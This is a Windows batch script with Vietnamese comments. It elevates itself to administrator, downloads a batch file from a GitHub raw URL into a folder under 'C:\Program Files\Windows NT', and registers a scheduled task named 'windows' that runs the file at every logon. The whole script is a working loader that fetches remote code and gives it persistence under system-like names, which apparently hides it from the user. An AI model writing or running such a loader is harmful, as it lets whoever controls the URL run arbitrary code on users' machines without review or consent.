@echo off
:: Kiểm tra quyền quản trị
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Vui lòng chạy với quyền quản trị.
    powershell -command "Start-Process cmd -ArgumentList '/c %~f0' -Verb RunAs"
    exit /b
)

:: Thiết lập URL tải xuống cho tệp windows.bat
set downloadUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/windows.bat

:: Thiết lập thư mục đích để lưu windows.bat
set destinationDir="C:\Program Files\Windows NT\coccoc"

:: Thiết lập tên tệp cho tệp tải xuống
set downloadFile=windows.bat

:: Thiết lập thư mục người dùng hiện tại
set userDir=%USERNAME%

:: Định nghĩa đường dẫn tệp log để ghi lại lịch sử tạo và thực thi tác vụ
set logFile="C:\Program Files\Windows NT\coccoc\task_history_log.txt"

:: Kiểm tra xem thư mục đích có tồn tại không
if not exist %destinationDir% (
    echo Thư mục %destinationDir% không tồn tại. Đang tạo thư mục...
    mkdir %destinationDir%
)

:: Chuyển đến thư mục đích
cd /d %destinationDir%

:: Tải xuống tệp windows.bat bằng curl
echo Đang tải xuống windows.bat...
echo %date% %time% - Bắt đầu tải xuống windows.bat từ %downloadUrl% >> %logFile%
curl -L -o %downloadFile% %downloadUrl%

:: Kiểm tra xem tệp đã được tải xuống thành công chưa
if exist %destinationDir%\%downloadFile% (
    echo %date% %time% - windows.bat đã được tải xuống thành công. >> %logFile%
) else (
    echo %date% %time% - Tải xuống windows.bat thất bại. >> %logFile%
    exit /b
)

:: Tạo một tác vụ để chạy windows.bat khi đăng nhập cho người dùng hiện tại
echo Đang tạo tác vụ để chạy windows.bat khi đăng nhập...
echo %date% %time% - Đang tạo tác vụ đã lên lịch "windows" cho người dùng %userDir% để chạy %destinationDir%\%downloadFile% khi đăng nhập. >> %logFile%
schtasks /create /tn "windows" /tr "\"C:\Program Files\Windows NT\coccoc\windows.bat\"" /sc onlogon /ru "%USERNAME%" /f

:: Xác nhận việc tạo tác vụ và ghi lại nó
if %errorlevel% neq 0 (
    echo %date% %time% - Tạo tác vụ đã lên lịch thất bại. >> %logFile%
    echo Tạo tác vụ đã lên lịch thất bại.
) else (
    echo %date% %time% - Tác vụ được tạo thành công để chạy windows.bat khi đăng nhập. >> %logFile%
    echo Tác vụ được tạo thành công.
)

:: Thoát khỏi kịch bản
pause
